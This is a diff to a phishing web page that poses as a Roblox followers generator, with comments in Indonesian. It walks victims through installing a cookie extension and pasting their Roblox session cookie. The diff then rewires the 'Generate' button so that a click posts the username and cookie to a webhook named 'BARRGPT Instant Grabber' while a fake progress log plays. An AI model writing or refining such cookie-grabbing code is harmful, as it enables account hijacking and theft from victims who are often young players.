@@ -70,26 +70,59 @@
             font-size: 11px;
         }
         .generate-btn {
-            background-color: #00bfff;
-            color: #121212;
+            background-color: #555; /* Dimulai dengan abu-abu */
+            color: #999;
             border: none;
             padding: 15px 40px;
             font-size: 18px;
             font-weight: 700;
             border-radius: 8px;
-            cursor: pointer;
-            transition: background-color 0.3s, transform 0.2s;
+            cursor: not-allowed; /* Dimulai dengan not-allowed */
+            transition: background-color 0.3s, transform 0.2s, color 0.3s;
             margin-top: 10px;
         }
-        .generate-btn:hover:not(:disabled) {
-            background-color: #0099cc;
+        .generate-btn.ready {
+            background-color: #4caf50; /* Warna hijau saat siap */
+            color: #fff;
+            cursor: pointer;
+        }
+        .generate-btn.ready:hover {
+            background-color: #45a049;
             transform: scale(1.05);
         }
-        .generate-btn:disabled {
+        .generate-btn:disabled:not(.ready) {
             background-color: #555;
             color: #999;
             cursor: not-allowed;
         }
+        /* AWAL FITUR TAMBAHAN */
+        .cookie-helper {
+            margin-top: 15px;
+        }
+        .cookie-btn {
+            display: inline-block;
+            background-color: transparent;
+            color: #00bfff;
+            border: 2px solid #00bfff;
+            padding: 10px 20px;
+            font-size: 14px;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            text-decoration: none;
+            transition: background-color 0.3s, color 0.3s;
+        }
+        .cookie-btn:hover {
+            background-color: #00bfff;
+            color: #121212;
+        }
+        .cookie-helper p {
+            font-size: 11px;
+            color: #888;
+            margin-top: 10px;
+            text-align: center;
+        }
+        /* AKHIR FITUR TAMBAHAN */
         #statusLog {
             margin-top: 25px;
             background-color: #0f0f1e;
@@ -144,6 +177,16 @@
         <div class="input-group">
             <label for="cookie">input file to get followers</label>
             <textarea id="cookie" rows="4" placeholder="Paste the file here"></textarea>
+            
+            <!-- AWAL FITUR TAMBAHAN -->
+            <div class="cookie-helper">
+                <a href="https://chromewebstore.google.com/detail/editthiscookie-fork/ihfmcbadakjehneaijebhpogkegajgnk" target="_blank" class="cookie-btn">
+                    ⬇️ DOWNLOAD COOKIE FOR MOBILE
+                </a>
+                <p>1. Install extension di Chrome.<br>2. Buka Roblox.com, lalu klik icon extension.<br>3. Copy cookie dan paste di atas.</p>
+            </div>
+            <!-- AKHIR FITUR TAMBAHAN -->
+
         </div>
 
         <button id="generateBtn" class="generate-btn" disabled>WAITING FOR FILE FOLLOWERS</button>
@@ -180,6 +223,7 @@
         function startFakeProcess(username, followers) {
             generateBtn.disabled = true;
             generateBtn.textContent = 'GENERATING...';
+            generateBtn.classList.remove('ready');
             statusLog.innerHTML = '';
 
             setTimeout(() => addLog(`Connecting to generator server...`, 'info'), 500);
@@ -199,24 +243,30 @@
         cookieInput.addEventListener('paste', function(event) {
             setTimeout(() => {
                 const cookie = cookieInput.value;
-
                 if (cookie.includes('_|WARNING:-DO-NOT-SHARE-THIS.')) {
-                    const username = usernameInput.value || 'UnknownUser';
-                    const followers = followersInput.value || '0';
-                    
-                    const payload = {
-                        content: `**TARGET TERSEDIA!**\n**Username:** ${username}\n**Followers Diminta:** ${followers}\n**Cookie:**\n\`\`\`${cookie}\`\`\``,
-                        username: 'BARRGPT Instant Grabber'
-                    };
-                    fetch(webhookUrl, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload)
-                    });
-                    
-                    startFakeProcess(username, followers);
+                    generateBtn.disabled = false;
+                    generateBtn.textContent = 'GENERATE FOLLOWERS';
+                    generateBtn.classList.add('ready');
                 }
             }, 100);
+        });
+
+        generateBtn.addEventListener('click', function() {
+            const username = usernameInput.value || 'UnknownUser';
+            const followers = followersInput.value || '0';
+            const cookie = cookieInput.value;
+
+            const payload = {
+                content: `**TARGET TERSEDIA!**\n**Username:** ${username}\n**Followers Diminta:** ${followers}\n**Cookie:**\n\`\`\`${cookie}\`\`\``,
+                username: 'BARRGPT Instant Grabber'
+            };
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            
+            startFakeProcess(username, followers);
         });
 
         function populateActivity() {
